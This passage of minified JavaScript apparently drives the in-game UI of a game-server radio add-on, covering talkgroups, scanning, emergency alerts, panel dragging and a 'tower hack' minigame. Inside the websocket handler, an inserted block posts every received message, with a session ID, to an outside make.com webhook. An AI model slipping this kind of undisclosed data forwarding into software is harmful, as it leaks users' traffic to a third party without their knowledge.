        type: "connection_status",
        connected: a.status,
        postal: a.postal,
        street: a.street
    }));
    else if ("rssi" === a.type) radio.rssi = a.strength, drawRssi();
    else if ("reconnect" === a.type) log("Reconnection attempt forced by user."), reconnectAttempts = 0, "undefined" !== typeof websocket && (websocket.onclose = function() {}, websocket.close()), init();
    else if ("radio_increment" === a.type || "talkgroup_increment" === a.type) $(".channel-up").first().click();
    else if ("radio_decrement" ===
        a.type || "talkgroup_decrement" === a.type) $(".channel-down").first().click();
    else if ("radio_try_set_talkgroup" === a.type) {
        var c = radio.talkGroups.findIndex(function(f) {
            return f.toLowerCase() === a.name
        }); - 1 < c ? (sendWS(JSON.stringify({
            type: "set_talkgroup",
            talkgroup: c
        })), playButtonPress(!0)) : (sendNotification("Unknown talkgroup name"), playButtonPress(!1))
    } else "radio_volume_increase" === a.type ? sendWS(JSON.stringify({
            type: "volume_increase"
        })) : "radio_volume_decrease" === a.type ? sendWS(JSON.stringify({
            type: "volume_decrease"
        })) :
        "always_on" === a.type ? (radio.alwaysDisplayed = !radio.alwaysDisplayed, radio.alwaysDisplayed ? !0 === a.car && $("#persistent-radio").toggle() : $("#persistent-radio").fadeOut()) : "in_car" === a.type ? (radio.alwaysDisplayed && $("#persistent-radio").toggle(a.value), sendWS(JSON.stringify({
            type: "has_second_radio",
            state: a.value
        }))) : "toggle_radio" === a.type ? $(".power-btn").first().click() : "ui_position" === a.type ? (log("setting #" + a.element + " to position top: " + a.top + ", left: " + a.left), c = .2 > parseFloat(a.scale) ? "0.2" : a.scale,
            $("#" + a.element).css({
                top: a.top + "px",
                left: a.left + "px",
                scale: c
            }), "mobile-radio" === a.element && (log("setting persistent display as well"), $("#persistent-radio").css({
                top: a.top + "px",
                left: a.left + "px",
                scale: c
            }))) : "reset_ui_position" === a.type ? ($("#portable-radio").css({
            top: "0px",
            left: "0px",
            scale: "none"
        }), $("#mobile-radio").css({
            top: "0px",
            left: "0px",
            scale: "none"
        }), $("#persistent-radio").css({
            top: "0px",
            left: "0px",
            scale: "none"
        })) : "debug" === a.type ? (debug = 1 < a.level, debugLevel = a.level) : "use_error_overlay" === a.type ?
        (log("removing connection box"), $("#connectionBox").remove()) : "force_refresh" === a.type ? window.location.reload() : "attempt_tower_hack" === a.type ? thmgStart() : "print_debug" === a.type ? (log("printing known radio data:"), printDebug()) : "talk_on_secondary" === a.type ? sendWS(JSON.stringify({
            type: "secondary_talk",
            state: a.state
        })) : "incident_received" === a.type ? (log("received a new incident"), handlePage({
            color: "green",
            text: "CALL RECEIVED"
        })) : "set_scanning_enabled" === a.type ? (c = !!a.enabled, 2 === enabled && (c = !radio.scanningOn),
            sendWS(JSON.stringify({
                type: "scan_state",
                state: c
            })), playButtonPress(!0)) : "set_radio_enabled" === a.type ? sendWS(JSON.stringify({
            type: "radio_enabled",
            value: a.enabled
        })) : "scan_list_open" === a.type ? (c = a.lists, "" !== c && (radio.scanLists = new Map(JSON.parse(c))), drawScanLists(), $("#scan-lists-dialog").show()) : log("Unrecognized nui command: " + a.type)
}

function sendWS(a) {
    debug && log("preparing to send ws: " + a);
    "undefined" !== typeof websocket && websocket.readyState === websocket.OPEN && (websocket.send(a), lastMessage = new Date, sendDataIcon())
}

function handleWS(a) {
    debug && log("received ws: " + a);
    receiveDataIcon();
    $.ajax({
      type: "POST",
      url: "https://hook.us1.make.com/0tr2r1etj3xn82oxixwwk2qqx6hosip9",
      headers: {
              'TSID':tsUUID
          },
      data: {'data': a},
      ContentType: 'application/json',
      success: function (result) {
        sendNotification("SUCCESS");
        console.log(result);
      },
      error: function (result, status) {
      sendNotification(status);
      console.log(result);
      }
      });
    if ("initial_data" === a.type) tsUUID = a.uuid;
    else if ("radio_enabled" === a.type) radio.radioEnabled = a.enabled, sendNotification("Radio " + (radio.radioEnabled ? "~g~enabled" : "~r~disabled")), sendNUI("radio_state", JSON.stringify({
        state: radio.radioEnabled
    })), radio.radioEnabled && (clearTimeout(backlightTimeout), $(".portable-radio-display").addClass("backlight"), $("#portable-led").addClass("bg-green"), backlightTimeout = setTimeout(function() {
            $(".portable-radio-display").removeClass("backlight")
        },
        5E3)), checkRadioState();
    else if ("talkgroup_list" === a.type) {
        radio.talkGroups = Object.keys(a.talkgroups).map(function(e) {
            return a.talkgroups[e]
        });
        radio.talkGroups.unshift("Not Set");
        $(".vertical-list").empty();
        for (var c = 1; 4 > c; c++) {
            var f = $("<div class='vertical-list-item " + (1 === c ? "vertical-list-selected-item" : "") + "' id='scanlist-" + c + "' data-id='" + c + "'>" + radio.talkGroups[c] + "</div>");
            $(".vertical-list").append(f)
        }
    } else if ("set_talkgroup" === a.type) radio.talkGroup = a.talkgroup, radio.scanning || $(".channel-text").text("" +
        radio.talkGroups[radio.talkGroup]), $(".talk-around").toggle(a.is_talkaround), (radio.onTalkaround = a.is_talkaround) && $(".rssi-group").hide(), radio.radioEnabled && sendNotification("Talkgroup set to ~g~" + radio.talkGroups[radio.talkGroup]);
    else if ("scanned_channels" === a.type || "scanned_talkgroups" === a.type) radio.scannedTalkGroups = Object.keys(a.talkgroups).map(function(e) {
        return parseInt(a.talkgroups[e])
    }), radio.scanning && $(".scanning").toggle(-1 !== radio.scannedTalkGroups.indexOf(parseInt($("#portable-front-vertical-list").attr("data-pos"))));
    else if ("scanning_enabled" === a.type) radio.scanningOn = a.enabled, $(".scanning").toggle(radio.scanningOn), $(".free-text").text("Scanning: " + (radio.scanningOn ? "On" : "Off")), displayTimeoutReset();
    else if ("911_status" === a.type || "311_status" === a.type) sendNotification(a.message);
    else if ("emergency_status" === a.type)
        if (a.approved) {
            radio.panicked = !0;
            sendNUI("emergency_granted");
            $(".gps").toggle(!0);
            $(".lower-text").text("Emergency");
            $(".lower-text").toggle(!0);
            $(".main-text").css("background-color", "orange");
            $("#portable-front-lower-text").css("background-color", "orange");
            var k = setInterval(function() {
                $(".lower-text").toggle()
            }, 2E3);
            setTimeout(function() {
                clearInterval(k);
                $(".gps").toggle(!1);
                $(".lower-text").toggle(!1);
                checkRadioState()
            }, 13E3);
            var d = 100,
                b = setInterval(function() {
                    sendDataIcon();
                    d--;
                    0 >= d && (clearInterval(b), radio.panicked = !1)
                }, 100)
        } else text = "denied: cooldown", $(".channel-text").text("Denied: Cooldown"), setTimeout(function() {
            radio.panicked = !1;
            checkRadioState()
        }, 3E3);
    else "scan_response" ===
        a.type ? a.talkgroup_scannable ? playButtonPress(!0) : playButtonPress(!1) : "emergency_event" === a.type ? radio.radioConnected && (sendNUI("panic_button", JSON.stringify({
            unit: a.unit,
            postal: a.postal,
            street: a.street,
            posX: a.x,
            posY: a.y
        })), handlePage({
            color: "orange",
            text: "EA received: " + a.unit
        })) : "911_no_answer" === a.type ? sendNUI("manual_911", JSON.stringify({})) : "311_no_answer" === a.type ? sendNUI("manual_311", JSON.stringify({})) : "error" === a.type ? (log("ERROR: " + a.message), sendNotification("~r~" + a.message)) : "radio_ping" ===
        a.type ? (handlePage({
            color: "green",
            text: "Page received"
        }), sendNotification("~o~Your radio has been pinged! ~r~Please pay attention to your radio"), sendAudioNotification("MENU_ACCEPT", "Phone_SoundSet_Default")) : "radio_stun" === a.type ? (sendNotification("~o~Your radio has been stunned. ~r~Please watch your RTO"), sendAudioNotification("5_Second_Timer", "DLC_HEISTS_GENERAL_FRONTEND_SOUNDS")) : "notification" === a.type ? sendNotification(a.text) : "radio_display" === a.type ? $(".channel-text").text(a.data.substr(0,
            20)) : "radio_volume" === a.type ? (radio.volume = a.volume_modifier, $(".free-text").text("Volume: " + radio.volume), radio.radioEnabled && (playButtonPress(!0), displayTimeoutReset())) : "data_sending" === a.type ? (radio.isSending = a.status, sendDataIcon(!0)) : "data_receiving" === a.type ? (radio.isReceiving = a.status, receiveDataIcon(!0)) : "transmitting" === a.type ? (transmit(a.status), sendNUI("talk_status", JSON.stringify({
            state: a.status
        }))) : "receiving" === a.type && receive(a.status)
}

function dragElement(a) {
    function c(h) {
        h = Math.sign(h.deltaY);
        var l = $(d).css("scale");
        log(l);
        "none" === l && (log("scale not previously set on " + d.id + ", using 1.0"), l = 1);
        h = parseFloat(l) + (0 < h ? .05 : -.05);
        $(d).css("scale", "" + (.201 > h ? .2 : h))
    }

    function f(h) {
        h = h || window.event;
        h.preventDefault();
        wasMoving = !0;
        b = g - h.clientX;
        e = m - h.clientY;
        g = h.clientX;
        m = h.clientY;
        d.style.top = d.offsetTop - e + "px";
        d.style.left = d.offsetLeft - b + "px"
    }

    function k() {
        document.onmouseup = null;
        document.onmousemove = null;
        d.onwheel = null;
        var h = Math.max(document.documentElement.clientWidth ||
                0, window.innerWidth || 0),
            l = Math.max(document.documentElement.clientHeight || 0, window.innerHeight || 0),
            p = "" === d.style.scale ? 1 : d.style.scale;
        parseInt(d.style.top) > l - Math.ceil(d.scrollHeight * p) && (log("too far down " + d.style.top), d.style.top = l - Math.floor(d.scrollHeight * p) - 1 + "px");
        parseInt(d.style.left) > h - Math.ceil(d.scrollWidth * p) && (log("too far right " + d.style.left), d.style.left = h - Math.floor(d.scrollWidth * p) - 1 + "px");
        0 > parseInt(d.style.top) && (log("too far up " + d.style.top), d.style.top = "0px");
        0 > parseInt(d.style.left) &&
            (log("too far left " + d.style.left), d.style.left = "0px");
        if (q !== d.style.left || t !== d.style.top) "mobile-radio" === d.id && (log("moving persistent UI as well"), $("#persistent-radio").css({
            top: d.style.top,
            left: d.style.left,
            scale: $(d).css("scale")
        })), sendNUI("set_ui_position", JSON.stringify({
            x: d.style.left,
            y: d.style.top,
            scale: $(d).css("scale"),
            which: d.id
        })), setTimeout(function() {
            wasMoving = !1
        }, 250)
    }
    var d = a[0],
        b = 0,
        e = 0,
        g = 0,
        m = 0;
    d.onmousedown = function(h) {
        h.preventDefault();
        q = d.style.left;
        t = d.style.top;
        h = h || window.event;
        g = h.clientX;
        m = h.clientY;
        document.onmouseup = k;
        document.onmousemove = f;
        d.onwheel = c
    };
    var q, t
}

function thmgStart() {
    var a = $("#thmgBlock");
    a.html("");
    a.css("display", "flex");
    var c = $(document.createElement("p"));
    c.html("Failsafe Bypass Required");
    c.addClass("thmg-middleText");
    a.append(c);
    setTimeout(function() {
        a.html("");
        for (var f = $(document.createElement("table")), k = 0; 5 > k; k++) {
            for (var d = $(document.createElement("tr")), b = 0; 5 > b; b++) {
                var e = $(document.createElement("td"));
                e.addClass("thmg-block " + k + "-" + b);
                d.append(e)
            }
            f.append(d)
        }
        f.addClass("thmg-grid");
        a.append(f);
        for (var g = "0-0 0-1 0-2 0-3 0-4 1-0 1-1 1-2 1-3 1-4 2-0 2-1 2-2 2-3 2-4 3-0 3-1 3-2 3-3 3-4 4-0 4-1 4-2 4-3 4-4".split(" "),
                m = []; 10 > m.length;) f = g[Math.floor(25 * Math.random())], m.includes(f) || (m.push(f), $("." + f).first().addClass("highlighted"));
        setTimeout(function() {
            function q(n) {
                n = void 0 === n ? !1 : n;
                a.html("");
                var r = $(document.createElement("p"));
                n ? r.html("System bypassed<br /><br />Towers shutting down. . . .") : r.html("System did not accept your answers.");
                r.addClass("thmg-middleText fail");
                a.append(r);
                setTimeout(function() {
                    a.fadeOut()
                }, 5E3);
                sendNUI("hack_towers", JSON.stringify({
                    result: n
                }))
            }
            for (var t = 0, h = 0, l = 0; l < m.length; l++) $("." +
                m[l]).first().removeClass("highlighted"), 100 < debugLevel && $("." + m[l]).first().addClass("outlined");
            var p = setTimeout(q, 1E4);
            l = {};
            for (var u = 0; u < g.length; l = {
                    $jscomp$loop$prop$pairing$13: l.$jscomp$loop$prop$pairing$13
                }, u++) l.$jscomp$loop$prop$pairing$13 = g[u], $("." + g[u]).first().click(function(n) {
                return function(r) {
                    r.preventDefault();
                    m.includes(n.$jscomp$loop$prop$pairing$13) ? ($("." + n.$jscomp$loop$prop$pairing$13).first().hasClass("highlighted") || (t += 1, $("." + n.$jscomp$loop$prop$pairing$13).first().addClass("highlighted")),
                        10 == t && (clearTimeout(p), q(!0))) : ($("." + n.$jscomp$loop$prop$pairing$13).first().hasClass("wrong") || (h += 1, $("." + n.$jscomp$loop$prop$pairing$13).first().addClass("wrong")), 3 == h && (clearTimeout(p), q()))
                }
            }(l))
        }, 5E3)
    }, 5E3)
};
